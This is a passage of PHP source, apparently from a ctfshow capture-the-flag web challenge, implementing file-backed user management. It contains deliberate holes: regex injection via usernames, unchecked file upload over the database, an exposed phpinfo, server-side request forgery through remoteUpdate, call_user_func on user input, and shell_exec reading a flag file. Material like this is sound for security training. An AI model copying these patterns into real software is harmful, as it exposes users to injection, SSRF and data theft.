</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>getUsers</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$page</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span><span class=nv>$limit</span><span class=o>=</span><span class=mi>10</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;数据获取成功&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;data&#39;</span><span class=o>=&gt;</span><span class=k>array</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nv>$isadmin</span> <span class=o>=</span> <span class=s1>&#39;否&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$pass</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span><span class=o>=</span><span class=s1>&#39;无&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$users</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nx>array_pop</span><span class=p>(</span><span class=nv>$users</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$index</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>foreach</span> <span class=p>(</span><span class=nv>$users</span> <span class=k>as</span> <span class=nv>$u</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;@&#39;</span><span class=p>,</span> <span class=nv>$u</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>==</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=nv>$isadmin</span> <span class=o>=</span> <span class=s1>&#39;是&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=nv>$pass</span> <span class=o>=</span> <span class=s1>&#39;flag就是管理员的密码，不过我隐藏了&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=nv>$content</span> <span class=o>=</span> <span class=s1>&#39;删除此条记录后flag就会消失&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nv>$pass</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;@&#39;</span><span class=p>,</span> <span class=nv>$u</span><span class=p>)[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nx>array_push</span><span class=p>(</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>],</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>			<span class=s1>&#39;id&#39;</span><span class=o>=&gt;</span><span class=nv>$index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			<span class=s1>&#39;username&#39;</span><span class=o>=&gt;</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;@&#39;</span><span class=p>,</span> <span class=nv>$u</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>			<span class=s1>&#39;password&#39;</span><span class=o>=&gt;</span><span class=nv>$pass</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			<span class=s1>&#39;isAdmin&#39;</span><span class=o>=&gt;</span><span class=nv>$isadmin</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			<span class=s1>&#39;content&#39;</span><span class=o>=&gt;</span><span class=nv>$content</span>
</span></span><span class=line><span class=cl>		<span class=p>));</span>
</span></span><span class=line><span class=cl>		<span class=nv>$index</span> <span class=o>+=</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;count&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$index</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$start</span> <span class=o>=</span> <span class=p>(</span><span class=nv>$page</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=nv>$limit</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>array_slice</span><span class=p>(</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>],</span> <span class=nv>$start</span><span class=p>,</span><span class=nv>$limit</span><span class=p>,</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>addUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;添加成功&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>)</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$s</span> <span class=o>=</span> <span class=nv>$data</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@&#39;</span><span class=o>.</span><span class=nv>$password</span><span class=o>.</span><span class=s1>&#39;|&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span><span class=o>=-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;用户已存在&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>updateUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;更新成功&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nv>$username</span><span class=o>!=</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$s</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@[0-9a-zA-Z]+\|/&#39;</span><span class=p>,</span> <span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@&#39;</span><span class=o>.</span><span class=nv>$password</span><span class=o>.</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span><span class=o>=-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;用户不存在或无权更新&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>delUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;删除成功&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nv>$username</span><span class=o>!=</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$s</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@[0-9a-zA-Z]+\|/&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span><span class=o>=-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;用户不存在或无权删除&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>existsUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$username</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s1>&#39;@[0-9a-zA-Z]+\|/&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>backupUsers</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$file_name</span> <span class=o>=</span> <span class=nx>DB_PATH</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=nx>file_exists</span> <span class=p>(</span><span class=nv>$file_name</span> <span class=p>))</span> <span class=p>{</span>    
</span></span><span class=line><span class=cl>	    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;HTTP/1.1 404 NOT FOUND&#39;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>    
</span></span><span class=line><span class=cl>	    <span class=nv>$file</span> <span class=o>=</span> <span class=nx>fopen</span> <span class=p>(</span><span class=nv>$file_name</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span> <span class=p>);</span> 
</span></span><span class=line><span class=cl>	    <span class=nx>Header</span> <span class=p>(</span> <span class=s2>&#34;Content-type: application/octet-stream&#34;</span> <span class=p>);</span> 
</span></span><span class=line><span class=cl>	    <span class=nx>Header</span> <span class=p>(</span> <span class=s2>&#34;Accept-Ranges: bytes&#34;</span> <span class=p>);</span>  
</span></span><span class=line><span class=cl>	    <span class=nx>Header</span> <span class=p>(</span> <span class=s2>&#34;Accept-Length: &#34;</span> <span class=o>.</span> <span class=nx>filesize</span> <span class=p>(</span><span class=nv>$file_name</span><span class=p>));</span>  
</span></span><span class=line><span class=cl>	    <span class=nx>Header</span> <span class=p>(</span> <span class=s2>&#34;Content-Disposition: attachment; filename=backup.dat&#34;</span><span class=p>);</span>     
</span></span><span class=line><span class=cl>	    <span class=k>echo</span> <span class=nx>str_replace</span><span class=p>(</span><span class=nx>FLAG645</span><span class=p>,</span> <span class=s1>&#39;flag就在这里，可惜不能给你&#39;</span><span class=p>,</span> <span class=nx>fread</span> <span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=nx>filesize</span> <span class=p>(</span><span class=nv>$file_name</span><span class=p>)));</span>    
</span></span><span class=line><span class=cl>	    <span class=nx>fclose</span> <span class=p>(</span> <span class=nv>$file</span> <span class=p>);</span>    
</span></span><span class=line><span class=cl>	    <span class=k>exit</span> <span class=p>();</span>    
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>getArray</span><span class=p>(</span><span class=nv>$total</span><span class=p>,</span> <span class=nv>$times</span><span class=p>,</span> <span class=nv>$min</span><span class=p>,</span> <span class=nv>$max</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$min</span> <span class=o>*</span> <span class=nv>$times</span> <span class=o>&gt;</span> <span class=nv>$total</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$max</span> <span class=o>*</span> <span class=nv>$times</span> <span class=o>&lt;</span> <span class=nv>$total</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=nv>$times</span> <span class=o>&gt;=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$times</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kmix</span> <span class=o>=</span> <span class=nx>max</span><span class=p>(</span><span class=nv>$min</span><span class=p>,</span> <span class=nv>$total</span> <span class=o>-</span> <span class=nv>$times</span> <span class=o>*</span> <span class=nv>$max</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kmax</span> <span class=o>=</span> <span class=nx>min</span><span class=p>(</span><span class=nv>$max</span><span class=p>,</span> <span class=nv>$total</span> <span class=o>-</span> <span class=nv>$times</span> <span class=o>*</span> <span class=nv>$min</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kAvg</span> <span class=o>=</span> <span class=nv>$total</span> <span class=o>/</span> <span class=p>(</span><span class=nv>$times</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kDis</span> <span class=o>=</span> <span class=nx>min</span><span class=p>(</span><span class=nv>$kAvg</span> <span class=o>-</span> <span class=nv>$kmix</span><span class=p>,</span> <span class=nv>$kmax</span> <span class=o>-</span> <span class=nv>$kAvg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$r</span> <span class=o>=</span> <span class=p>((</span><span class=nx>float</span><span class=p>)(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>10000</span><span class=p>)</span> <span class=o>/</span> <span class=mi>10000</span><span class=p>)</span> <span class=o>-</span> <span class=mf>0.5</span><span class=p>)</span> <span class=o>*</span> <span class=nv>$kDis</span> <span class=o>*</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$k</span> <span class=o>=</span> <span class=nx>round</span><span class=p>(</span><span class=nv>$kAvg</span> <span class=o>+</span> <span class=nv>$r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$total</span> <span class=o>-=</span> <span class=nv>$k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>recoveryUsers</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;恢复成功&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>]</span><span class=o>&lt;</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$file_name</span><span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$result</span> <span class=o>=</span> <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$file_name</span><span class=p>,</span> <span class=nx>DB_PATH</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nv>$result</span><span class=o>===</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;数据恢复失败 file_name&#39;</span><span class=o>.</span><span class=nv>$file_name</span><span class=o>.</span><span class=s1>&#39; DB_PATH=&#39;</span><span class=o>.</span><span class=nx>DB_PATH</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;数据恢复失败&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>phpInfoTest</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>authKeyValidate</span><span class=p>(</span><span class=nv>$auth</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=nv>$auth</span><span class=o>==</span><span class=nx>substr</span><span class=p>(</span><span class=nx>FLAG645</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span><span class=o>?</span><span class=s1>&#39;验证成功&#39;</span><span class=o>:</span><span class=s1>&#39;验证失败&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;status&#39;</span><span class=o>=&gt;</span><span class=nv>$auth</span><span class=o>==</span><span class=nx>substr</span><span class=p>(</span><span class=nx>FLAG645</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span><span class=o>?</span><span class=s1>&#39;0&#39;</span><span class=o>:</span><span class=s1>&#39;-1&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>remoteUpdate</span><span class=p>(</span><span class=nv>$auth</span><span class=p>,</span><span class=nv>$address</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;更新失败&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$auth</span><span class=o>!==</span><span class=nx>substr</span><span class=p>(</span><span class=nx>FLAG645</span><span class=p>,</span> <span class=mi>8</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;权限key验证失败&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=p>(</span><span class=nv>$content</span><span class=o>!==</span><span class=k>false</span><span class=o>?</span><span class=nv>$content</span><span class=o>:</span><span class=s1>&#39;地址不可达&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilString</span><span class=p>(</span><span class=nv>$m</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$key</span> <span class=o>=</span> <span class=s1>&#39;372619038&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span> <span class=o>=</span> <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG647&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;you are not 372619038?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilClass</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>public</span> <span class=nv>$m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>public</span> <span class=k>function</span> <span class=nf>construct</span><span class=p>(</span><span class=nv>$m</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$m</span><span class=o>=</span><span class=nv>$m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$ctfshow</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfshow</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ctfshow</span><span class=o>-&gt;</span><span class=nv>$m</span><span class=o>=</span><span class=nv>$m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$ctfshow</span><span class=o>-&gt;</span><span class=nv>$m</span><span class=o>==</span><span class=nv>$m</span> <span class=o>&amp;&amp;</span> <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG647&#39;</span><span class=p>)){</span>
